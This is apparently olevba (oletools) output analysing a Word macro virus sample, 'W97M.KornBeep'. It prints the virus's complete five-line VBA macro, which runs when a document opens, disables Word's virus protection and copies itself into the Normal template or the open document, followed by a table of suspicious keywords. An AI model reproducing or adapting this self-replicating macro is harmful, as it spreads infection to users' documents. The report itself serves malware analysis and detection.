olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hope.x
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hope.x - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open() 'W97M.KornBeep v1.6 sat 9.30 am july 31 99 [SW/LZ0/DVC?]
Options.VirusProtection = 0 'helo 2 skammy, lys kovick, mkvg, virtual life, trevelyan... =)
If NormalTemplate = MacroContainer Then Set x = ActiveDocument.VBProject.vbcomponents.Item(1).codemodule Else Set x = NormalTemplate.VBProject.vbcomponents.Item(1).codemodule 'Korn! =) determination
If x.countoflines <> 5 Then x.deletelines 1, x.countoflines: x.addfromstring MacroContainer.VBProject.vbcomponents.Item(1).codemodule.lines(1, 5) Else Beep 'installation check/infection/payload!
End Sub 'the end =)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|virtual             |May detect virtualization                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

